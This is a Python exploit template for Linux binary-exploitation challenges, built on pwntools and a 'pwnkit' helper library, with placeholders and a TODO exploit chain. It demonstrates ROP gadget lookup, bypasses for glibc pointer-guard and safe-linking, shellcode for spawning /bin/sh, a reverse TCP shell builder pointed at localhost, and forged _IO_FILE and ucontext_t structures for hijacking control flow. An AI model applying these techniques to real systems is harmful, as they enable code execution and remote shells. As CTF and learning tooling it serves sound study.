#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: {author} - {blog}
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <HOST> <PORT> | <HOST:PORT> ]
#

from pwnkit import *
from pwn import *
import sys

# CONFIG
# ---------------------------------------------------------------------------
BIN_PATH   = {file_path!r}
LIBC_PATH  = {libc_path!r}
host, port = load_argv(sys.argv[1:])
ssl  = {ssl}
env  = {{}}
elf  = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH) if LIBC_PATH else None

Context({arch!r}, {os!r}, {endian!r}, {log!r}, {term!r}).push()
io = Config(BIN_PATH, LIBC_PATH, host, port, ssl, env).run()
alias(io)	# s, sa, sl, sla, r, rl, ru, uu64, g, gp
init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# HEAP 
# ------------------------------------------------------------------------
@argx(by_name={{"n":itoa}})
def menu(n: int):
    pass

@argx(by_type={{int:itoa}})
def allo():
    pass

def free():
    pass

def edit():
    pass

def show():
    pass

# EXPLOIT
# ------------------------------------------------------------------------
def exploit(*args, **kwargs):
   
    # TODO: exploit chain

    # - ROP after leaking libc_base
    libc.address = libc_base
    ggs     = ROPGadgets(libc)
    p_rdi_r = ggs['p_rdi_r']
    p_rsi_r = ggs['p_rsi_r']
    p_rax_r = ggs['p_rax_r']
    p_rsp_r = ggs['p_rsp_r']
    p_rdx_rbx_r = ggs['p_rdx_rbx_r']
    leave_r = ggs['leave_r']
    ret     = ggs['ret']
    ggs.dump()  # dump all gadgets to stdout

    # - Libc Pointer protection
    # 1) pointer guard
    guard = 0xdeadbeef  # leak it or overwrite it
    pg = PointerGuard(guard)
    ptr = 0xcafebabe
    enc_ptr = pg.mangle(ptr)
    dec_ptr = pg.demangle(enc_ptr)
    assert ptr == dec_ptr

    # 2) safe linking 
    #    e.g., after leaking heap_base for tcache
    slk = SafeLinking(heap_base)
    fd = 0x55deadbeef
    enc_fd = slk.encrypt(fd)
    dec_fd = slk.decrypt(enc_fd)
    assert fd == dec_fd

    # - Shellcode generation
    # 1) list all built-in available shellcodes
    for name in list_shellcodes():
            print(" -", name)

    # 2) retrieve by arch + name, default variant (min)
    sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
    print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
    print(hex_shellcode(sc.blob))   # output as hex

    # 3) pretty dump
    sc.dump()  

    # 4) retrieve explicit variant
    sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
    print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
    print(hex_shellcode(sc.blob))

    # 5) retrieve via composite key
    sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
    print(f"[+] Got shellcode: {sc.name}")
    print(hex_shellcode(sc.blob))

    # 6) fuzzy lookup
    sc = ShellcodeReigstry.get("amd64", "ls_")
    print(f"[+] Fuzzy match: {sc.name}")
    print(hex_shellcode(sc.blob))

    # 7) builder demo: reverse TCP shell (amd64)
    builder = ShellcodeBuilder("amd64")
    rev = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
    print(f"[+] Built reverse TCP shell ({len(rev)} bytes)")
    print(hex_shellcode(rev))

    # - IO FILE exploit
    # 1) create an _IO_FILE_plus object
    f = IOFilePlus()

    # 2) iterate its fields
    for field in f.fields:  # or f.iter_fileds()
        print(field)

    # 3) set FILE members
    # Use aliases
    f.flags      = 0xfbad1800
    f.write_base = 0x13370000
    f.write_ptr  = 0x13370040
    f.mode       = 0
    f.fileno     = 1
    f.chain      = 0xcafebabe
    f.vtable     = 0xdeadbeef

    # Also honors original glibc naming
    f._flags = 0xfbad1800
    f._IO_write_base = 0x13370000

    # use the built-in set() method
    f.set('_lock', 0x41414141)  # set field via name 
    f.set(116, 0x42424242)      # _flags2, set via a specific offset

    # 4) pretty dump to screen
    f.dump()

    # 5) retrieve a field value via get() method
    vtable = f.get("vtable")    # retrieve via name
    vtable = f.get(0xd8)        # via offset

    # 6) create a snapshot for FILE
    snapshot = f.bytes          # or: f.to_bytes()
    snapshot2 = f.data          # use the `data` bytearray class member
    print(f"[+] IO FILE snapshot in bytes:\n{snapshot}\n{snapshot2})")

    # 7) create an IOFilePlus class object by importing a data blob
    f2 = IOFilePlus.from_bytes(blob=snapshot, arch="amd64")
    
    # 8) Load IOFilePlus data like glibc
    f.load({
        # housekeeping
        "_flags": 0xfbad0000,				  # 0x00               
        # readable window (no active read buffer)
        "_IO_read_ptr":  0,                   # 0x08
        "_IO_read_end":  0,                   # 0x10
        "_IO_read_base": 0,                   # 0x18
        # writable window
        "_IO_write_base":0x404300,            # 0x20
        "_IO_write_ptr": 0x404308,            # 0x28
        "_IO_write_end": 0,                   # 0x30        
        # backing buffer 
        "_IO_buf_base":  0,                   # 0x38
        "_IO_buf_end":   0,                   # 0x40
        "_IO_save_base": 0,                   # 0x48
        "_IO_backup_base": 0,                 # 0x50
        "_IO_save_end":  0,                   # 0x58
        # linkage & housekeeping
        "_markers":      0,                   # 0x60
        "_chain":        0,                   # 0x68
        "_fileno":       1,                   # 0x70
        "_flags2":       0,                   # 0x74
        "_old_offset":   0,                   # 0x78
        "_cur_column":   0,                   # 0x80
        "_vtable_offset":0,                   # 0x82
        "_shortbuf":     0,                   # 0x83
        "_lock":         0,                   # 0x88
        "_offset":       0,                   # 0x90
        "_codecvt":      0,                   # 0x98
        "_wide_data":    0,                   # 0xa0
        "_freeres_list": 0,                   # 0xa8
        "_freeres_buf":  0,                   # 0xb0
        "__pad5":        0,                   # 0xb8
        "_mode":         0,                   # 0xc0
        "_unused2":      b"\x00"*0x14,        # 0xc4
        # pivot: fake vtable 
        "vtable":        0xdeadbeefcafebabe,  # 0xd8  
    }, strict=True)
    
    # dump bytes for injection
    blob = f.bytes
    
    # - Exploit ucontext_t buffering
    # 1) create a ucontext_t buffer
    uc = UContext("amd64")
    
    # 2) WRITE buffer values
    # full dotted name (case sensitive)
    uc.set("uc_mcontext.gregs.RIP", 0x4011d0)         
    # sugars (case sensitive)
    uc.set_reg("rdi", 0x1337)	    	# set registers                     
    uc.set_stack(						# set signal stack
        sp    = 0x7fffffff0000,
        size  = 0x1111,
        flags = 0xdeadbeef
    )   
    # write RIP via absolute offset (0xA8 inside ucontext)
    uc.set(0xA8, 0xdeadbeefcafebabe)
    # patch arbitrary blob (raw write; no name resolution)
    uc.patch(0x1A8, (0x037F).to_bytes(2, "little"))  # fcw in __fpregs_mem
    # block SIGALRM (14) + SIGINT (2)
    uc.set_sigmask_block([14, 2])
    # or explicit by bytes
    raw_mask = b"\x00" * 0x80
    uc.set("uc_sigmask[128]", raw_mask)
    # use the load() method
    uc.load({
        # gregs
        "R8":  0,		# 0x28
        "R9":  0,		# 0x30
        "R12": 0,		# 0x48
        "R13": 0,		# 0x50
        "R14": 0,		# 0x58
        "R15": 0,		# 0x60
        "RDI": 0,		# 0x68
        "RSI": 0,		# 0x70
        "RBP": 0,		# 0x78
        "RBX": 0,		# 0x80
        "RDX": 0,		# 0x88
        "RAX": 0,		# 0x90
        "RCX": 0,		# 0x98
        "RSP": 0x7fffffff0000,	# 0xA0
        "RIP": 0xdeadbeef,     	# 0xA8
        # floating point stuff
        "FPREGS": 0x404000,    	# 0xB0: fldenv pointer
        "MXCSR":  0x1F80,      	# 0x1C0: default safe SSE state
    }, strict=True)
    uc.dump()

    # dump bytes for injection
    blob = uc.bytes
    
    #3) READ values
    # back by canonical field names
    print("RDI =", hex(uc.get("uc_mcontext.gregs.RDI")))
    print("RSI =", hex(uc.get("uc_mcontext.gregs.RSI")))
    # or by short aliases
    print("RIP =", hex(uc.get("RIP")))
    print("RIP =", hex(uc.rip))

    # 4) Parse from an existing blob
    blob = b"\x00"*0x3C8
    uc2 = UContext.from_bytes(blob, arch="amd64")


    io.interactive()

# PIPELINE
# ------------------------------------------------------------------------
if __name__ == "__main__":
    exploit()

